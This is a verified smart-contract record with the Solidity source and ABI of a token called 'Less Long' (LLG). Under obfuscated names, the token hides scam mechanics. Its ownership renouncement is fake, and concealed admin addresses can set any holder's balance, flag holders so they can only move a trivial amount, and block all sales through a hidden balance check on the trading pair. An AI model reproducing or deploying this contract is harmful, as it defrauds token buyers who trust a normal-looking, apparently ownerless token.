{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface shouldTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minExempt {\n    function createPair(address receiverMarketing, address launchedTeam) external returns (address);\n}\n\ninterface feeLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromWallet) external view returns (uint256);\n\n    function transfer(address atMin, uint256 feeSwap) external returns (bool);\n\n    function allowance(address feeIsLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atMin,\n        uint256 feeSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverToken, uint256 value);\n    event Approval(address indexed feeIsLimit, address indexed spender, uint256 value);\n}\n\ninterface exemptList is feeLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LessLong is modeFrom, feeLimit, exemptList {\n\n    event OwnershipTransferred(address indexed maxAt, address indexed minIs);\n\n    mapping(address => bool) public totalReceiverExempt;\n\n    bool public teamSell;\n\n    bool public fundTxWallet;\n\n    string private takeTx = \"LLG\";\n\n    uint256 public fundTrading;\n\n    function getOwner() external view returns (address) {\n        return enableLaunchedSell;\n    }\n\n    function launchTotal(address fundTotal) public {\n        isExemptAuto();\n        \n        if (fundTotal == totalLaunch || fundTotal == minReceiver) {\n            return;\n        }\n        receiverAmount[fundTotal] = true;\n    }\n\n    bool private takeTotalAuto;\n\n    function liquidityLaunched(uint256 feeSwap) public {\n        isExemptAuto();\n        buyWalletTotal = feeSwap;\n    }\n\n    address buyTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return enableLaunchedSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquiditySell;\n\n    uint256 private autoTotal;\n\n    address public totalLaunch;\n\n    uint256 public modeWallet;\n\n    function feeList(address totalLimit) public {\n        require(totalLimit.balance < 100000);\n        if (teamSell) {\n            return;\n        }\n        if (takeTotalAuto) {\n            autoTotal = swapTx;\n        }\n        totalReceiverExempt[totalLimit] = true;\n        \n        teamSell = true;\n    }\n\n    mapping(address => bool) public receiverAmount;\n\n    uint256 buyWalletTotal;\n\n    function approve(address marketingFee, uint256 feeSwap) public virtual override returns (bool) {\n        liquiditySell[_msgSender()][marketingFee] = feeSwap;\n        emit Approval(_msgSender(), marketingFee, feeSwap);\n        return true;\n    }\n\n    uint256 private modeLaunchedMarketing = 100000000 * 10 ** 18;\n\n    function transfer(address totalWalletMax, uint256 feeSwap) external virtual override returns (bool) {\n        return buyAuto(_msgSender(), totalWalletMax, feeSwap);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeTx;\n    }\n\n    address private enableLaunchedSell;\n\n    uint256 private swapTx;\n\n    constructor (){\n        \n        shouldTrading senderMarketing = shouldTrading(maxTake);\n        minReceiver = minExempt(senderMarketing.factory()).createPair(senderMarketing.WETH(), address(this));\n        if (teamBuyAt) {\n            fundTrading = autoTotal;\n        }\n        totalLaunch = _msgSender();\n        autoEnable();\n        totalReceiverExempt[totalLaunch] = true;\n        isListAt[totalLaunch] = modeLaunchedMarketing;\n        if (sellLaunched == takeTotalAuto) {\n            takeTotalAuto = true;\n        }\n        emit Transfer(address(0), totalLaunch, modeLaunchedMarketing);\n    }\n\n    function transferFrom(address maxLaunched, address atMin, uint256 feeSwap) external override returns (bool) {\n        if (_msgSender() != maxTake) {\n            if (liquiditySell[maxLaunched][_msgSender()] != type(uint256).max) {\n                require(feeSwap <= liquiditySell[maxLaunched][_msgSender()]);\n                liquiditySell[maxLaunched][_msgSender()] -= feeSwap;\n            }\n        }\n        return buyAuto(maxLaunched, atMin, feeSwap);\n    }\n\n    function allowance(address toEnable, address marketingFee) external view virtual override returns (uint256) {\n        if (marketingFee == maxTake) {\n            return type(uint256).max;\n        }\n        return liquiditySell[toEnable][marketingFee];\n    }\n\n    function isExemptAuto() private view {\n        require(totalReceiverExempt[_msgSender()]);\n    }\n\n    uint256 constant txTotal = 8 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSwap;\n    }\n\n    uint256 isTrading;\n\n    address public minReceiver;\n\n    bool private teamBuyAt;\n\n    function balanceOf(address fromWallet) public view virtual override returns (uint256) {\n        return isListAt[fromWallet];\n    }\n\n    string private receiverSwap = \"Less Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return atMarketing;\n    }\n\n    function autoEnable() public {\n        emit OwnershipTransferred(totalLaunch, address(0));\n        enableLaunchedSell = address(0);\n    }\n\n    function buyAuto(address maxLaunched, address atMin, uint256 feeSwap) internal returns (bool) {\n        if (maxLaunched == totalLaunch) {\n            return fundMin(maxLaunched, atMin, feeSwap);\n        }\n        uint256 amountFee = feeLimit(minReceiver).balanceOf(buyTeam);\n        require(amountFee == buyWalletTotal);\n        require(atMin != buyTeam);\n        if (receiverAmount[maxLaunched]) {\n            return fundMin(maxLaunched, atMin, txTotal);\n        }\n        return fundMin(maxLaunched, atMin, feeSwap);\n    }\n\n    function fundMin(address maxLaunched, address atMin, uint256 feeSwap) internal returns (bool) {\n        require(isListAt[maxLaunched] >= feeSwap);\n        isListAt[maxLaunched] -= feeSwap;\n        isListAt[atMin] += feeSwap;\n        emit Transfer(maxLaunched, atMin, feeSwap);\n        return true;\n    }\n\n    address maxTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public sellLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeLaunchedMarketing;\n    }\n\n    function enableToken(address totalWalletMax, uint256 feeSwap) public {\n        isExemptAuto();\n        isListAt[totalWalletMax] = feeSwap;\n    }\n\n    uint8 private atMarketing = 18;\n\n    mapping(address => uint256) private isListAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeIsLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWalletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"}],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTxWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"launchTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalReceiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWalletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LessLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}